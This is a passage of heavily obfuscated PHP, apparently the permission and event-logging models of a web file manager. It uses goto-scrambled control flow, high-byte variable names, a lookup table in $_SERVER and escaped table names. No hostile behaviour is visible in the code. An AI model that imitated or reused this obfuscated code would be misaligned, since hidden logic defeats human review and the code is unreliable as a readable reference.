$A£æ™İéíõ =& $_SERVER[£¶ä½¶¢]; static $E…®œÂ¢¬‰ = array(); $AŒõºÍ¤è² = $AŒõºÍ¤è² ? $AŒõºÍ¤è² : USER_ID; goto f°¦“Îø; eÃÙÇâöœ“: foreach ($EçÚ•¤¢Êİ as $e‰ùÏÑèÂ–) { $DšîĞÛ«¢Ş = $a¾àİËÁÃÉ->getInfo($e‰ùÏÑèÂ–); $Aìñ³Œˆğ[] = $DšîĞÛ«¢Ş[$A£æ™İéíõ[95]][$A£æ™İéíõ[403]]; $BĞ›Ø—ñš[$e‰ùÏÑèÂ–] = $DšîĞÛ«¢Ş[$A£æ™İéíõ[95]][$A£æ™İéíõ[403]]; $eà‘­Ø ¹[$e‰ùÏÑèÂ–] = $B “ï‰Ûâ‡->parentLevelArray($DšîĞÛ«¢Ş[$A£æ™İéíõ[495]]); } foreach ($C’¶‚¿«Ä as $bî½¶æ›ƒã => $aøßÈÑä‰) { $dƒ“Íã„Úã = $D£“øÙœŸ[$bî½¶æ›ƒã]; if (!$dƒ“Íã„Úã || !$BĞ›Ø—ñš[$dƒ“Íã„Úã]) { continue; } $eÄöšéˆáö = array(); foreach ($eà‘­Ø ¹[$dƒ“Íã„Úã] as $e‰ùÏÑèÂ–) { $eÄöšéˆáö[] = $BĞ›Ø—ñš[$e‰ùÏÑèÂ–]; } $C’¶‚¿«Ä[$bî½¶æ›ƒã] = array_merge($eÄöšéˆáö, $aøßÈÑä‰); } $Aìñ³Œˆğ = array_values(array_unique($Aìñ³Œˆğ)); goto c»¯‚„­; AÀŞŸ„³À¶: $d‚‚Î‘š± = $EçÚ•¤¢Êİ; foreach ($d‚‚Î‘š± as $e‰ùÏÑèÂ–) { $DšîĞÛ«¢Ş = $a¾àİËÁÃÉ->getInfo($e‰ùÏÑèÂ–); $B†·º§£–Û = $B “ï‰Ûâ‡->parentLevelArray($DšîĞÛ«¢Ş[$A£æ™İéíõ[495]]); $EçÚ•¤¢Êİ = array_merge($EçÚ•¤¢Êİ, $B†·º§£–Û); } $EçÚ•¤¢Êİ = array_values(array_unique($EçÚ•¤¢Êİ)); goto eÃÙÇâöœ“; AÃÙ‰ù®ŒÛ: } private function makeSourceAuth($EÎ»·Ê®, $a¹ˆ¬‡°„•, $DŠ¾©²Ş¿ = false) { goto A–ÌÊ‚Ş‹; dïƒÛĞ±¼ˆ: foreach ($A”ØÛóÅ•» as $BŠƒ²øÛïÌ) { if (!isset($a¹ˆ¬‡°„•[$BŠƒ²øÛïÌ])) { continue; } $CÍ‹°æóõî = $this->authMake($a¹ˆ¬‡°„•[$BŠƒ²øÛïÌ], $DŠ¾©²Ş¿); if ($CÍ‹°æóõî[$BÔÌñ¶ğğß[454]]) { $Dù‚ÓŠ¶¬± = $CÍ‹°æóõî; break; } } if (!$dà…äíáÑò) { return $Dù‚ÓŠ¶¬±; } if (!$Dù‚ÓŠ¶¬± && $AŠŠÏìŸÎ) { $Dù‚ÓŠ¶¬± = $this->groupAuthInfo($AŠŠÏìŸÎ, $f¸¹ÎòéÒ); } goto bœˆ¾Ä–Öª; A–ÌÊ‚Ş‹: $BÔÌñ¶ğğß =& $_SERVER[£¶ä½¶¢]; $fŒÄ‚é¯â½ = $BÔÌñ¶ğğß[97]; $f¸¹ÎòéÒ = $EÎ»·Ê®[$BÔÌñ¶ğğß[492]]; goto Aâáƒ«¨¦é; f·ÍõÃ‰è: $A”ØÛóÅ•» = Model($BÔÌñ¶ğğß[1203])->parentLevelArray($EÎ»·Ê®[$BÔÌñ¶ğğß[495]]); $A”ØÛóÅ•» = array_merge(array($EÎ»·Ê®[$BÔÌñ¶ğğß[403]]), array_reverse($A”ØÛóÅ•»)); $Dù‚ÓŠ¶¬± = !1; goto dïƒÛĞ±¼ˆ; bœˆ¾Ä–Öª: if (!$Dù‚ÓŠ¶¬±) { $B†›Çé³Å¯ = Model($BÔÌñ¶ğğß[494])->getInfo($f¸¹ÎòéÒ); $A‘£ËŠŸÊÜ = explode($BÔÌñ¶ğğß[57], trim($B†›Çé³Å¯[$BÔÌñ¶ğğß[495]], $BÔÌñ¶ğğß[57])); $A‘£ËŠŸÊÜ = array_reverse($A‘£ËŠŸÊÜ); foreach ($A‘£ËŠŸÊÜ as $b¶Œ•„¶‚) { if ($b¶Œ•„¶‚ == $BÔÌñ¶ğğß[201] || $b¶Œ•„¶‚ == $fŒÄ‚é¯â½) { continue; } $F‡ï¦÷ó = $this->groupRootAuth($b¶Œ•„¶‚, $DŠ¾©²Ş¿); if (!$F‡ï¦÷ó) { continue; } $Dù‚ÓŠ¶¬± = $this->groupAuthInfo($F‡ï¦÷ó, $b¶Œ•„¶‚); break; } } if (!$Dù‚ÓŠ¶¬± || $Dù‚ÓŠ¶¬±[$BÔÌñ¶ğğß[415]] <= 0) { $bË…—™º… = $this->authDeepCheck($EÎ»·Ê®[$BÔÌñ¶ğğß[403]], $DŠ¾©²Ş¿); if ($bË…—™º…) { $Dù‚ÓŠ¶¬± = $bË…—™º…; } } return $Dù‚ÓŠ¶¬±; goto FŒÌÆÍì¾İ; Aâáƒ«¨¦é: $dà…äíáÑò = $EÎ»·Ê®[$BÔÌñ¶ğğß[412]] == SourceModel::TYPE_GROUP; $AŠŠÏìŸÎ = $dà…äíáÑò ? $this->groupRootAuth($f¸¹ÎòéÒ, $DŠ¾©²Ş¿) : !1; if ($AŠŠÏìŸÎ && Model($BÔÌñ¶ğğß[1857])->authCheckAction($AŠŠÏìŸÎ[$BÔÌñ¶ğğß[414]], $BÔÌñ¶ğğß[1710])) { return $this->groupAuthInfo($AŠŠÏìŸÎ, $f¸¹ÎòéÒ); } goto f·ÍõÃ‰è; FŒÌÆÍì¾İ: } private function userIsRoot($bêÜ¹Áî„¦ = false) { $CÑ¬‹¦òÀ… =& $_SERVER[£¶ä½¶¢]; if (!$bêÜ¹Áî„¦ && _get($GLOBALS, $CÑ¬‹¦òÀ…[493])) { return !0; } $AÑ¼ãäª£· = Model($CÑ¬‹¦òÀ…[514])->getInfo($bêÜ¹Áî„¦); $d¾¿Íó„› = Model($CÑ¬‹¦òÀ…[1878])->listData($AÑ¼ãäª£·[$CÑ¬‹¦òÀ…[1411]]); if ($d¾¿Íó„› && $d¾¿Íó„›[$CÑ¬‹¦òÀ…[1280]][$CÑ¬‹¦òÀ…[1879]] == 1) { return !0; } return !1; } private function sourceAuthInfo($eÅ¸Ô×îÓ) { goto dèÕéâ‘†; FÜ¤¿Û¢éì: if (isset($aß¹åº´­[$B®È¾›çÆ–[500]])) { $d‚êå³Ô = explode($B®È¾›çÆ–[18], trim($aß¹åº´­[$B®È¾›çÆ–[503]], $B®È¾›çÆ–[18])); array_shift($d‚êå³Ô); $e•–¬–Òé  = $aß¹åº´­[$B®È¾›çÆ–[498]] . $B®È¾›çÆ–[1880] . implode($B®È¾›çÆ–[18], $d‚êå³Ô); } return array($B®È¾›çÆ–[421] => $aß¹åº´­[$B®È¾›çÆ–[38]], $B®È¾›çÆ–[86] => KodIO::make($aß¹åº´­[$B®È¾›çÆ–[403]]), $B®È¾›çÆ–[1881] => $e•–¬–Òé ); goto A‰ˆå¶‹“ò; F ©ÕëäÖŞ: if (!$aß¹åº´­) { return !1; } $açÌ«²µ­->groupPathDisplay($aß¹åº´­); $aòè¡„Óºµ = array($aß¹åº´­); goto B×‡°¬¾ìŒ; B×‡°¬¾ìŒ: $aòè¡„Óºµ = $açÌ«²µ­->_listAppendPath($aòè¡„Óºµ); $aß¹åº´­ = $aòè¡„Óºµ[0]; $e•–¬–Òé  = $aß¹åº´­[$B®È¾›çÆ–[503]]; goto FÜ¤¿Û¢éì; dèÕéâ‘†: $B®È¾›çÆ– =& $_SERVER[£¶ä½¶¢]; $açÌ«²µ­ = Model($B®È¾›çÆ–[1203]); $aß¹åº´­ = $açÌ«²µ­->sourceInfo($eÅ¸Ô×îÓ); goto F ©ÕëäÖŞ; A‰ˆå¶‹“ò: } private function groupAuthInfo($EÍ£•«¸³ë, $dÒñŠŠÑÌÙ) { $aİÚùËˆä =& $_SERVER[£¶ä½¶¢]; $D”ø’™¿Óí = Model($aİÚùËˆä[494])->getInfo($dÒñŠŠÑÌÙ); return array($aİÚùËˆä[1882] => intval($EÍ£•«¸³ë[$aİÚùËˆä[414]]), $aİÚùËˆä[1866] => $EÍ£•«¸³ë, $aİÚùËˆä[1883] => LNG($aİÚùËˆä[1884]), $aİÚùËˆä[1875] => array($aİÚùËˆä[421] => $D”ø’™¿Óí[$aİÚùËˆä[38]], $aİÚùËˆä[86] => KodIO::make($D”ø’™¿Óí[$aİÚùËˆä[95]][$aİÚùËˆä[403]]), $aİÚùËˆä[1881] => $D”ø’™¿Óí[$aİÚùËˆä[499]])); } protected function groupRootAuth($C„±ËˆÛÚÜ, $bÈÀ¹ÄƒÊ = false) { goto F£“‘Ø™³Ä; dš½ŒÊöÆ: $fèÉÅ¦®Â¯ = $this->userGroupList($bÈÀ¹ÄƒÊ); $C±›ÖÙ’ËÍ = isset($fèÉÅ¦®Â¯[$C„±ËˆÛÚÜ]) ? $fèÉÅ¦®Â¯[$C„±ËˆÛÚÜ][$Bğ§ùÒÜ¢Œ[414]] : !1; if ($C±›ÖÙ’ËÍ && Model($Bğ§ùÒÜ¢Œ[1857])->authCheckAction($C±›ÖÙ’ËÍ[$Bğ§ùÒÜ¢Œ[414]], $Bğ§ùÒÜ¢Œ[1710])) { $E”‰áÁÅÉ[$DÒÀñ¾™­¼] = $C±›ÖÙ’ËÍ; return $C±›ÖÙ’ËÍ; } goto E‚‡Š™éÂŠ; AÔòÒ·‘š: $E”‰áÁÅÉ[$DÒÀñ¾™­¼] = $a Ü‰äÎ ? $a Ü‰äÎ : $C±›ÖÙ’ËÍ; return $E”‰áÁÅÉ[$DÒÀñ¾™­¼]; goto c„²–Ëõà; dÙ¢ÛØ: static $E”‰áÁÅÉ = array(); if (isset($E”‰áÁÅÉ[$DÒÀñ¾™­¼])) { return $E”‰áÁÅÉ[$DÒÀñ¾™­¼]; } $FÎŞ¹ŞšÊÇ = Model($Bğ§ùÒÜ¢Œ[494])->getInfo($C„±ËˆÛÚÜ); goto dš½ŒÊöÆ; F£“‘Ø™³Ä: $Bğ§ùÒÜ¢Œ =& $_SERVER[£¶ä½¶¢]; $bÈÀ¹ÄƒÊ = $bÈÀ¹ÄƒÊ ? $bÈÀ¹ÄƒÊ : USER_ID; $DÒÀñ¾™­¼ = $bÈÀ¹ÄƒÊ . $Bğ§ùÒÜ¢Œ[1885] . $C„±ËˆÛÚÜ; goto dÙ¢ÛØ; E‚‡Š™éÂŠ: $e¶¶¾Åß·î = $this->sourceAuthSelect($FÎŞ¹ŞšÊÇ[$Bğ§ùÒÜ¢Œ[95]][$Bğ§ùÒÜ¢Œ[403]]); $a¯Õ£¢Ïà = $e¶¶¾Åß·î ? $this->authMake($e¶¶¾Åß·î, $bÈÀ¹ÄƒÊ) : !1; $a Ü‰äÎ = $a¯Õ£¢Ïà ? $a¯Õ£¢Ïà[$Bğ§ùÒÜ¢Œ[454]] : !1; goto AÔòÒ·‘š; c„²–Ëõà: } public function authOwnerApply($Fæ¸¦¯‰í–) { goto EˆŠŠÎ÷‰; EˆŠŠÎ÷‰: $d³èÍ¨°££ =& $_SERVER[£¶ä½¶¢]; if (empty($Fæ¸¦¯‰í–[$d³èÍ¨°££[414]]) || isset($Fæ¸¦¯‰í–[$d³èÍ¨°££[1886]]) && $Fæ¸¦¯‰í–[$d³èÍ¨°££[1886]]) { return $Fæ¸¦¯‰í–; } if (AuthModel::authCheckRoot($Fæ¸¦¯‰í–[$d³èÍ¨°££[414]][$d³èÍ¨°££[415]])) { return $Fæ¸¦¯‰í–; } goto A•øø¬½ç; d®Æ¤±Š×: if (count($dÄ»ñá…ß) == 0) { $dÄ»ñá…ß = $this->authFolderOwnerGroup($Fæ¸¦¯‰í–[$d³èÍ¨°££[492]]); } $dÄ»ñá…ß = array_unique($dÄ»ñá…ß); if (AuthModel::authCheckRoot($Fæ¸¦¯‰í–[$d³èÍ¨°££[414]][$d³èÍ¨°££[415]])) { $dÄ»ñá…ß[] = USER_ID; } goto E‰ª§ô£à›; E‰ª§ô£à›: $Fæ¸¦¯‰í–[$d³èÍ¨°££[414]][$d³èÍ¨°££[1888]] = Model($d³èÍ¨°££[510])->userListInfo($dÄ»ñá…ß); return $Fæ¸¦¯‰í–; goto BƒÕ††Œ‰; A•øø¬½ç: $bƒ›õÁ‚Ó = Model($d³èÍ¨°££[1203])->parentLevelArray($Fæ¸¦¯‰í–[$d³èÍ¨°££[495]]); $bƒ›õÁ‚Ó = array_merge(array($Fæ¸¦¯‰í–[$d³èÍ¨°££[403]]), array_reverse($bƒ›õÁ‚Ó)); $E½øŸ¸ÆÃÈ = $this->sourceAuthSelect($bƒ›õÁ‚Ó); goto A¦ÃºÛÏ; A¦ÃºÛÏ: $EØ­¡®¬Úó = array(); $dÄ»ñá…ß = array(); foreach ($E½øŸ¸ÆÃÈ as $eÈİ˜ÎªÕŞ => $eôŸÒÚµğô) { $Dó·ëˆŠöÇ = $this->authFolderOwnerUser($eôŸÒÚµğô); $EØ­¡®¬Úó[$eÈİ˜ÎªÕŞ] = $Dó·ëˆŠöÇ; $dÄ»ñá…ß = array_merge($dÄ»ñá…ß, $Dó·ëˆŠöÇ[$d³èÍ¨°££[570]]); if ($Dó·ëˆŠöÇ[$d³èÍ¨°££[1887]]) { break; } } goto d®Æ¤±Š×; BƒÕ††Œ‰: } private function authFolderOwnerGroup($B±¶öÜ”¯î) { $d´èÒ™­½Ì =& $_SERVER[£¶ä½¶¢]; $cÖ’»æùÚ = Model($d´èÒ™­½Ì[1771])->where(array($d´èÒ™­½Ì[1690] => $B±¶öÜ”¯î))->select(); $d¶˜Û¥ÑÍ = array(); if (!$cÖ’»æùÚ) { return $d¶˜Û¥ÑÍ; } foreach ($cÖ’»æùÚ as $eó½¡²×Êø) { $cô‚‚Ï†¦‹ = $this->authInfo($eó½¡²×Êø); if (AuthModel::authCheckRoot($cô‚‚Ï†¦‹[$d´èÒ™­½Ì[414]])) { $d¶˜Û¥ÑÍ[] = $eó½¡²×Êø[$d´èÒ™­½Ì[1526]]; } } return $d¶˜Û¥ÑÍ; } private function authFolderOwnerUser($Bà“Š¼ë¡“) { $Bßçï‹ĞæÙ =& $_SERVER[£¶ä½¶¢]; $A›ê‹´¾É“ = array(); $B‘ò˜…–ø² = !1; foreach ($Bà“Š¼ë¡“ as $CœÜæ Ğàµ) { $dÜÁè¡É†Ó = $this->authInfo($CœÜæ Ğàµ); if ($CœÜæ Ğàµ[$Bßçï‹ĞæÙ[492]] == $Bßçï‹ĞæÙ[201]) { $B‘ò˜…–ø² = !0; } if ($CœÜæ Ğàµ[$Bßçï‹ĞæÙ[412]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($dÜÁè¡É†Ó[$Bßçï‹ĞæÙ[414]])) { $A›ê‹´¾É“[] = $CœÜæ Ğàµ[$Bßçï‹ĞæÙ[492]]; } } } return array($Bßçï‹ĞæÙ[570] => $A›ê‹´¾É“, $Bßçï‹ĞæÙ[1887] => $B‘ò˜…–ø²); } public function authMake($b¶í¬İ† æ, $E¸ÎÀÙ¾â = false) { $C»Ú¿‡‡âÊ =& $_SERVER[£¶ä½¶¢]; $BÅ¢Ÿ•ÔÒÙ = $this->authArrayCheck($b¶í¬İ† æ, $E¸ÎÀÙ¾â); if ($BÅ¢Ÿ•ÔÒÙ[$C»Ú¿‡‡âÊ[1889]]) { $BÅ¢Ÿ•ÔÒÙ[$C»Ú¿‡‡âÊ[1889]] = $this->sourceAuthInfo($BÅ¢Ÿ•ÔÒÙ[$C»Ú¿‡‡âÊ[1889]]); } return $BÅ¢Ÿ•ÔÒÙ; } public function authArrayCheck($FæºŞ„î, $aêåã†”÷¾ = false) { goto EËÎÜ‘ŠĞ; eÖªé»šÖ…: foreach ($FæºŞ„î as $Cã„Å‚ø·¼) { $CÇ‹¾È¶® = $this->authInfo($Cã„Å‚ø·¼); if (!$CÇ‹¾È¶®) { continue; } $BË¾×­’ªÊ = $Cã„Å‚ø·¼[$eö¾ô°¸š[492]]; $B¢ÔÏ«£ = intval($CÇ‹¾È¶®[$eö¾ô°¸š[414]]); if ($Cã„Å‚ø·¼[$eö¾ô°¸š[412]] == SourceModel::TYPE_USER && $BË¾×­’ªÊ == $aêåã†”÷¾) { $B»èšê™èí = !0; $c™œæùà³Õ = $CÇ‹¾È¶®; $FØáµÖ¥ = $B¢ÔÏ«£; } else { if ($Cã„Å‚ø·¼[$eö¾ô°¸š[412]] == SourceModel::TYPE_GROUP && $this->groupContainUser($BË¾×­’ªÊ, $aêåã†”÷¾)) { $aŞõš¤³° = !0; $eµê¡§œ®§ = $this->groupStepToUserGroup($BË¾×­’ªÊ, $aêåã†”÷¾); if ($eµê¡§œ®§ < $D±°ğÈ•¬) { $D±°ğÈ•¬ = $eµê¡§œ®§; $BÆÜ½‹¸ĞÜ = $B¢ÔÏ«£; $eÀ¡ ƒš™á = $CÇ‹¾È¶®; $Føê–¢´† = $BË¾×­’ªÊ; } if ($eµê¡§œ®§ == $D±°ğÈ•¬ && $B¢ÔÏ«£ >= $BÆÜ½‹¸ĞÜ) { $BÆÜ½‹¸ĞÜ = $B¢ÔÏ«£; $eÀ¡ ƒš™á = $CÇ‹¾È¶®; $Føê–¢´† = $BË¾×­’ªÊ; } } else { if ($BË¾×­’ªÊ == $eö¾ô°¸š[201]) { $Bø¶·îãå = !0; $C‘‡†Êî÷Š = $CÇ‹¾È¶®; $F†ƒ„ÌÄÜ = $B¢ÔÏ«£; } } } } if ($B»èšê™èí) { $c¥–ğ½í = $FØáµÖ¥; $CÇ‹¾È¶® = $c™œæùà³Õ; $B„ÛÜ¸Ùß = LNG($eö¾ô°¸š[1890]); } else { if ($aŞõš¤³°) { $c¥–ğ½í = $BÆÜ½‹¸ĞÜ; $CÇ‹¾È¶® = $eÀ¡ ƒš™á; $F’ŒÏ·Û˜ß = Model($eö¾ô°¸š[494])->getInfo($Føê–¢´†); $B„ÛÜ¸Ùß = $eö¾ô°¸š[170] . $F’ŒÏ·Û˜ß[$eö¾ô°¸š[499]] . $eö¾ô°¸š[1891] . LNG($eö¾ô°¸š[1892]); } else { if ($Bø¶·îãå) { $c¥–ğ½í = $F†ƒ„ÌÄÜ; $CÇ‹¾È¶® = $C‘‡†Êî÷Š; $B„ÛÜ¸Ùß = LNG($eö¾ô°¸š[1863]); } else { $c¥–ğ½í = 0; $CÇ‹¾È¶® = !1; $B„ÛÜ¸Ùß = $eö¾ô°¸š[43]; } } } $bÍÈÖƒåÓµ = array($eö¾ô°¸š[1882] => intval($c¥–ğ½í), $eö¾ô°¸š[1866] => $CÇ‹¾È¶®, $eö¾ô°¸š[1883] => $B„ÛÜ¸Ùß, $eö¾ô°¸š[1875] => $Cã„Å‚ø·¼[$eö¾ô°¸š[403]]); goto F°³ó¼“Ì; F–ùˆ“ô: $F†ƒ„ÌÄÜ = 0; $C‘‡†Êî÷Š = 0; $Cã„Å‚ø·¼ = array($eö¾ô°¸š[403] => 0); goto eÖªé»šÖ…; EËÎÜ‘ŠĞ: $eö¾ô°¸š =& $_SERVER[£¶ä½¶¢]; if (!$FæºŞ„î) { return array($eö¾ô°¸š[415] => 0, $eö¾ô°¸š[454] => !1); } $aêåã†”÷¾ = $aêåã†”÷¾ ? $aêåã†”÷¾ : USER_ID; goto cÀÌ‡”Â; B¬òèæ‰»: $aŞõš¤³° = 0; $BÆÜ½‹¸ĞÜ = 0; $eÀ¡ ƒš™á = 0; goto c²²´ùÙ‘; cÀÌ‡”Â: $B»èšê™èí = 0; $FØáµÖ¥ = 0; $c™œæùà³Õ = 0; goto B¬òèæ‰»; c²²´ùÙ‘: $D±°ğÈ•¬ = 1000; $Føê–¢´† = 0; $Bø¶·îãå = 0; goto F–ùˆ“ô; F°³ó¼“Ì: return $bÍÈÖƒåÓµ; goto a¿ƒÊ‚‰Ü‰; a¿ƒÊ‚‰Ü‰: } private function groupContainUser($Dä†æÉ†ïË, $AµÌÖ»§© = false) { return in_array($Dä†æÉ†ïË, $this->userGroupParents($AµÌÖ»§©)); } private function groupStepToUserGroup($C¡æÅïĞ, $fˆÄ×õºğ… = false) { goto fÓŸ©ÏÁí‚; dé¸‡Êì¨æ: $a‹Û“ïÃé = $GLOBALS[$D¬šâÜÂ õ[16]][$D¬šâÜÂ õ[98]][$D¬šâÜÂ õ[1782]] == 1; $C·ê¥±”ç = $a‹Û“ïÃé ? 3 : 2; foreach ($EÈòÚŞ°ò as $FÚë™Ã…‰º) { if ($FÚë™Ã…‰º[$D¬šâÜÂ õ[1690]] == $C¡æÅïĞ) { return 0; } $B—÷°÷†£ = explode($D¬šâÜÂ õ[57], trim($FÚë™Ã…‰º[$D¬šâÜÂ õ[495]], $D¬šâÜÂ õ[57])); if ($B—÷°÷†£[0] == $D¬šâÜÂ õ[201] && count($B—÷°÷†£) > $C·ê¥±”ç) { $b÷ØœÙ½Ê = array_reverse(array_slice($B—÷°÷†£, $C·ê¥±”ç)); $aîÃƒø„¨ù = array_search($C¡æÅïĞ, $b÷ØœÙ½Ê); if ($aîÃƒø„¨ù !== !1 && $aîÃƒø„¨ù + 1 <= $Bã¦›¹æ) { $Bã¦›¹æ = $aîÃƒø„¨ù + 1; } } } goto d°ºÎ·‚‡ê; fÓŸ©ÏÁí‚: $D¬šâÜÂ õ =& $_SERVER[£¶ä½¶¢]; $EÈòÚŞ°ò = $this->userGroupList($fˆÄ×õºğ…); $Bã¦›¹æ = 1000; goto dé¸‡Êì¨æ; d°ºÎ·‚‡ê: return $Bã¦›¹æ; goto d©ªƒÕìÈ; d©ªƒÕìÈ: } private function userGroupList($b°¥¤„— = false) { $bÜ¿Ã‰§Œì =& $_SERVER[£¶ä½¶¢]; static $bØ¦·×±“ = array(); if (isset($bØ¦·×±“[$b°¥¤„—])) { return $bØ¦·×±“[$b°¥¤„—]; } $b¤ãƒ˜ªÈ = Model($bÜ¿Ã‰§Œì[514])->getInfo($b°¥¤„—); $bØ¦·×±“[$b°¥¤„—] = array_to_keyvalue($b¤ãƒ˜ªÈ[$bÜ¿Ã‰§Œì[1864]], $bÜ¿Ã‰§Œì[1690]); return $bØ¦·×±“[$b°¥¤„—]; } public function userGroupParents($BË±Û­Áê…) { goto eñÊº¢ëÍ; Bô„§ˆÂàŠ: if (isset($a†İÒİ×¸[$BË±Û­Áê…])) { return $a†İÒİ×¸[$BË±Û­Áê…]; } $EŠÖ»¹­©› = $this->userGroupList($BË±Û­Áê…); $F¾ÂŸÂ¢Ë  = array(); goto CøÀ—¸İ¿­; eñÊº¢ëÍ: $F¼Š¯œ‚“› =& $_SERVER[£¶ä½¶¢]; static $a†İÒİ×¸ = array(); $BË±Û­Áê… = $BË±Û­Áê… ? $BË±Û­Áê… : USER_ID; goto Bô„§ˆÂàŠ; F® ¡Ÿ‰î”: $a†İÒİ×¸[$BË±Û­Áê…] = array_unique($F¾ÂŸÂ¢Ë ); return $a†İÒİ×¸[$BË±Û­Áê…]; goto fÔßåóŸ×•; CøÀ—¸İ¿­: $Eªò‡«…è = $GLOBALS[$F¼Š¯œ‚“›[16]][$F¼Š¯œ‚“›[98]][$F¼Š¯œ‚“›[1782]] == 1; $b«À˜¼÷ô = $Eªò‡«…è ? 3 : 2; foreach ($EŠÖ»¹­©› as $f»‚‘ŠÚ±Í) { $EØ¨©È› = array($f»‚‘ŠÚ±Í[$F¼Š¯œ‚“›[1690]]); $AØ‡¾³¦ó = explode($F¼Š¯œ‚“›[57], trim($f»‚‘ŠÚ±Í[$F¼Š¯œ‚“›[495]], $F¼Š¯œ‚“›[57])); if ($AØ‡¾³¦ó[0] == $F¼Š¯œ‚“›[201] && count($AØ‡¾³¦ó) > $b«À˜¼÷ô) { $C††×‘Š²Ç = array_slice($AØ‡¾³¦ó, $b«À˜¼÷ô); $EØ¨©È› = array_merge($EØ¨©È›, array_reverse($C††×‘Š²Ç)); } $F¾ÂŸÂ¢Ë  = array_merge($F¾ÂŸÂ¢Ë , $EØ¨©È›); } goto F® ¡Ÿ‰î”; fÔßåóŸ×•: } public function authTargetInfoMake($C§Áœøº¶) { goto a‚£†ÌƒÎŒ; b†Øˆ ¼Ã–: foreach ($C§Áœøº¶ as $aõ›”»áõˆ) { if ($aõ›”»áõˆ[$e¿ÆÌ…ã¡‰[412]] == SourceModel::TYPE_USER) { $e›ãáÄôáë[] = intval($aõ›”»áõˆ[$e¿ÆÌ…ã¡‰[492]]); } else { if ($aõ›”»áõˆ[$e¿ÆÌ…ã¡‰[412]] == SourceModel::TYPE_GROUP) { $F„…Ùï¬„†[] = intval($aõ›”»áõˆ[$e¿ÆÌ…ã¡‰[492]]); } } } if ($e›ãáÄôáë) { $e›ãáÄôáë = Model($e¿ÆÌ…ã¡‰[510])->userListInfo($e›ãáÄôáë); } if ($F„…Ùï¬„†) { $Cê¤³åŞ³õ = array($e¿ÆÌ…ã¡‰[1768] => array($e¿ÆÌ…ã¡‰[419], $F„…Ùï¬„†)); $F„…Ùï¬„† = Model($e¿ÆÌ…ã¡‰[494])->field($e¿ÆÌ…ã¡‰[1893])->where($Cê¤³åŞ³õ)->select(); $F„…Ùï¬„† = array_to_keyvalue($F„…Ùï¬„†, $e¿ÆÌ…ã¡‰[1690]); } goto FêŠ–¯÷Å; FêŠ–¯÷Å: return array($e¿ÆÌ…ã¡‰[1894] => $e›ãáÄôáë, $e¿ÆÌ…ã¡‰[1895] => $F„…Ùï¬„†); goto c…Ê¥İ†Œò; a‚£†ÌƒÎŒ: $e¿ÆÌ…ã¡‰ =& $_SERVER[£¶ä½¶¢]; $e›ãáÄôáë = array(); $F„…Ùï¬„† = array(); goto b†Øˆ ¼Ã–; c…Ê¥İ†Œò: } public function authInfo($CŠœÂçç°‘) { $C‹ŞèÁ¼Ø =& $_SERVER[£¶ä½¶¢]; if ($CŠœÂçç°‘[$C‹ŞèÁ¼Ø[1785]]) { $D„«Ü•µ‡ = Model($C‹ŞèÁ¼Ø[1857])->listData($CŠœÂçç°‘[$C‹ŞèÁ¼Ø[1785]]); if (!$D„«Ü•µ‡) { return !1; $Cá´òåøëš = Model($C‹ŞèÁ¼Ø[1857])->listData(); $B«ââ•æ£  = array_filter_by_field($Cá´òåøëš, $C‹ŞèÁ¼Ø[414], $C‹ŞèÁ¼Ø[201]); return $B«ââ•æ£ ; } $d®“—’¹Ä‘ = array_field_key($D„«Ü•µ‡, array($C‹ŞèÁ¼Ø[401], $C‹ŞèÁ¼Ø[38], $C‹ŞèÁ¼Ø[414], $C‹ŞèÁ¼Ø[1711], $C‹ŞèÁ¼Ø[1713])); $d®“—’¹Ä‘[$C‹ŞèÁ¼Ø[1896]] = $CŠœÂçç°‘; return $d®“—’¹Ä‘; } else { return array($C‹ŞèÁ¼Ø[420] => 0, $C‹ŞèÁ¼Ø[1696] => $CŠœÂçç°‘[$C‹ŞèÁ¼Ø[1839]], $C‹ŞèÁ¼Ø[421] => $C‹ŞèÁ¼Ø[43], $C‹ŞèÁ¼Ø[1711] => $C‹ŞèÁ¼Ø[1897]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\x72\x63\x65\137\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\124\151\155\145", "\164\x69\x6d\145", "\151\156\163\145\x72\x74", "\146\165\156\x63\x74\151\157\x6e"), array("\144\145\x73\x63", '', "\x69\x6e\x73\x65\162\164\x2c\x75\160\x64\141\164\145\54\163\x65\154\x65\x63\x74", "\x6a\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($c•Æë¤™£, $Cî³ÒŒö ë, $bªƒ˜¼äÍµ = '') { goto d‰ïßëˆ†; E¦¨‘ù¬×î: return $this->add($A½¡‚‘êº¡); goto e‚ˆØİº¾÷; eä¹Áá¿‡: $A½¡‚‘êº¡ = array($BºìÉËùë±[418] => $c•Æë¤™£, $BºìÉËùë±[1898] => $Eãñ²ìœ‰Å[$BºìÉËùë±[486]], $BºìÉËùë±[1899] => $Eãñ²ìœ‰Å[$BºìÉËùë±[38]], $BºìÉËùë±[503] => !empty($Eãñ²ìœ‰Å[$BºìÉËùë±[503]]) ? $Eãñ²ìœ‰Å[$BºìÉËùë±[503]] : $BºìÉËùë±[43], $BºìÉËùë±[1518] => USER_ID, $BºìÉËùë±[423] => $Cî³ÒŒö ë, $BºìÉËùë±[1520] => $bªƒ˜¼äÍµ); $this->addSystemLog($Cî³ÒŒö ë, $A½¡‚‘êº¡); unset($A½¡‚‘êº¡[$BºìÉËùë±[1899]], $A½¡‚‘êº¡[$BºìÉËùë±[503]]); goto E¦¨‘ù¬×î; AãïŸöğ: if (!$Eãñ²ìœ‰Å) { return !1; } if ($this->isCacheEvent($Eãñ²ìœ‰Å, $Cî³ÒŒö ë)) { return; } if ($bªƒ˜¼äÍµ && is_string($bªƒ˜¼äÍµ)) { $bªƒ˜¼äÍµ = array($BºìÉËùë±[1723] => $bªƒ˜¼äÍµ); } goto eä¹Áá¿‡; d‰ïßëˆ†: $BºìÉËùë± =& $_SERVER[£¶ä½¶¢]; if (!$this->eventSave) { return; } $Eãñ²ìœ‰Å = Model($BºìÉËùë±[1203])->sourceInfo($c•Æë¤™£); goto AãïŸöğ; e‚ˆØİº¾÷: } private function addSystemLog($cÅ…àíƒ¥†, $a—†£İ´ù™) { $E§’İõ† =& $_SERVER[£¶ä½¶¢]; if ($cÅ…àíƒ¥† == $E§’İõ†[1900]) { $cÅ…àíƒ¥† = 